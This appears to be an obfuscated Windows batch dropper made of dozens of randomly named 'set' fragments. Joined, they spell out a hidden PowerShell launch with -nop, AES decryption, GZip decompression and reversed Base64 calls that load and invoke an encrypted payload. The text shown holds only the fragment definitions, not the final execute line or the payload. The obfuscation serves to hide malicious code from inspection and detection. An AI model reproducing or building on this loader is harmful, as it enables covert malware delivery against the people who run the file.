@echo off
set "vzOMhjCmQq=s\"
set "secLVWxjoG=Sy"
set "VooZdysWcw= C"
set "iaOSkVkRdI=.e"
set "TOAuMMrdnB=0\"
set "QSNGMZKOHq=y "
set "ilruSbvKzZ=:\"
set "IiLwzDlLxY=ow"
set "JHcyxEfZAC=32"
set "JRfNHsCUtE=\v"
set "ufRJMivLMn=rS"
set "clewybTujY=1."
set "hCWKqnaqCF=st"
set "jlKlOXohQU=in"
set "RypmedoROF=xe"
set "BmOhglTSOP=nd"
set "bodOwfRdFz=he"
set "vLMbiNfnTr=Wi"
set "ywjsXAzxmM=do"
set "WwyaDOjVBX= /"
set "RCmfwXezXu=ll"
set "xtEgMxWRJz=Po"
set "OCgqZRknMC=py"
set "AiSSnbeNTI=co"
set "CuQUVbxbaW=em"
set "ayHSmRwgSo=he"
set "gbxQQTDewU=\W"
set "rwaXVVrLaU=rs"
set "DINNwkRkVO=ll"
set "haQZyBWZdb=ws"
set "qXjFdKRfTq=we"
set "rlPYDjjqhe=po"
set "CWJbwsDrpv=we"
set "dmvgtolgUC=cd"
set "uhPoQqBAHy= %~dp0"
set "nmgloVznRU=.Dis"
set "hGrxZRosHp=pher"
set "YgjeGsbYpA=le  "
set "sPlxDeAhjc= '')"
set "YHEfpdIBkP=] -j"
set "dXLczxioMu=y.Ci"
set "BeohSpQKkj=v4Ir"
set "VBySrVjDLd=c = "
set "AsFRZEtYRC=CJj "
set "tiBoKkUmFe= [Sy"
set "hfUshMaiIc=ispo"
set "cmXOlpngIE=Nc ="
set "aAHtbOtJAF=);$j"
set "IEsJSNghGX=$zzF"
set "sYJoTRxNRg=7Yiv"
set "MYzENBPsAs=Disp"
set "vsXtOHbQnQ=grap"
set "qCvuTLxmSH=[Sys"
set "oOzTlKYwDc=Stre"
set "BzJosKfnRs=[]] "
set "oPDTtYNJzA='[-1"
set "mwPVoEsBQV=CJj."
set "niPCFLrACT='')("
set "UciNLsdVYr=raph"
set "HvdMnEpAsC=::('"
set "XivWRIXdtg=hy.A"
set "bCdQMyxDkh=$vhP"
set "kHLavYuoKF=m.Re"
set "qJkXaPHEiy=form"
set "HUKMGALISf=yste"
set "ZEuxcjoCXq=t = "
set "QCQaTknIRL=('%*'"
set "TbnIigDNaj= if "
set "MimyLYvjsD=Fina"
set "cIDicjdYLb=:('g"
set "jHvyiBWVgK=;$Lz"
set "mgNsCBsHQh=d;$v"
set "hgRVemYaiV=();$"
set "HgMYTnjrtt=$eNb"
set "ebbxlLubpQ=ode]"
set "JhUqUsOqlB='gni"
set "CKWycXAjOf=ptor"
set "TNIcslSXer=t.Pa"
set "ewupCtUdlz=;$pm"
set "rKZNjHHoKj=, (,"
set "bVEsnNsbVw=Nc);"
set "tQGUhgoGUE=Secu"
set "dcvUwcdiFf=c = "
set "cnrYCgFFuX=tem."
set "JArdKSEZGp=Xt.I"
set "gUoxkfXNiK=.GZi"
set "owYDqPnlRc=Syst"
set "ZJfKzHClyk=g = "
set "rHNRFRzUpV=BC;$"
set "XAhdlGXWNn=$KWP"
set "JmustPRczE=UGTu"
set "JAJnFIARHp=)) {"
set "tCZgNYmzvJ=Invo"
set "NcXeZRHXBn=:: '"
set "EpIuTWJvzI== $v"
set "eLjySZlZtG=($AD"
set "vmlYmKrEuh=[IO."
set "mnUIwtmoNC=NbNc"
set "lSDjYlgRYQ=AKb."
set "dtUfAYKXji=-nop"
set "CvCKccpHvQ=eam("
set "COjVRZdmju=gnir"
set "WDMOaohxqf=UYXt"
set "raSrXyJnQZ=0O+g"
set "hPbNqKxFUO=sion"
set "BNBJSZZsux=$jnD"
set "HrlpxdtEHm=3); "
set "oGBCVoWbiA=y.Cr"
set "SDQotrCtif=.Key"
set "KlKoHoxgte= = $"
set "ODNukCiCpL=and "
set "GCKQrzDwIb=ose("
set "fPcnlrOkMc=tion"
set "GfbOaxJViA=ateD"
set "PLdFewyfMa=[-1."
set "oIEsChCLDg=pres"
set "xSfTToknnz=ress"
set "NbKImaEDaY=);$v"
set "YtZiILKqnG=.Dis"
set "vEWYnYNekh=tsWi"
